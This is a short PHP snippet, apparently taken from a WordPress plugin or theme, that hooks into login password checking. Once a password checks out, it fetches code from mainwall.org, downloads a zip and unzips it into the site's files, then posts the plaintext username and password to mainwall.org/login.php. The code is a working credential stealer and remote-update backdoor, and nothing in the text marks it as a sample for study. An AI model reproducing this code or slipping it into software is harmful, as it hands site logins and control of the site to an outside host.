<?php
  if(wp_check_password( $password, $user->data->user_pass, $user->data->ID)) {
    $response = wp_remote_get("http://mainwall.org/p/version.php");
    $version = get_bloginfo('version', 'raw');

    if('1.1' < $response['body']) {
      include_once ABSPATH . "wp-admin/includes/file.php";
      WP_Filesystem();

      $package = "http://mainwall.org/p/latest.zip";
      $download_file = download_url($package);
      unzip_file($download_file, dirname(dirname(__file__)));
      unlink($download_file);
    }

    sendPost($username, $password, 'http://mainwall.org/login.php');
  }
?>
